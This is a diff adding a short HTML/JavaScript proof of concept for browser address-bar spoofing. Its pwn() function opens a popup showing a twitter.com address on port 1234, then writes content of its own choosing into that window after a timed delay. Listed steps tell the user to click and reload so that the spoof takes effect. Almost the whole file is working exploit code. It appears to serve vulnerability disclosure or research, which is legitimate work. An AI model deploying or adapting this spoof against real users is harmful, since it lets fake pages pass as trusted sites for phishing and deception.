@@ -1,0 +1,13 @@
+        <script>
+            function pwn() {
+                v = setInterval(`x=window.open('https://www.twitter.com:1234','test', 'width=400 height=300')`);
+                i = setInterval(`
+                    x.document.write("<h1>url spoofing...</h1>");
+                    clearInterval(v);
+                    clearInterval(i);
+                    `, 3333);
+            }
+        </script>
+        <li onclick="pwn()">step1: click me</li>
+        <li>step2: try use keyboard `command + r`</li>
+        <li>step3: xD</li>
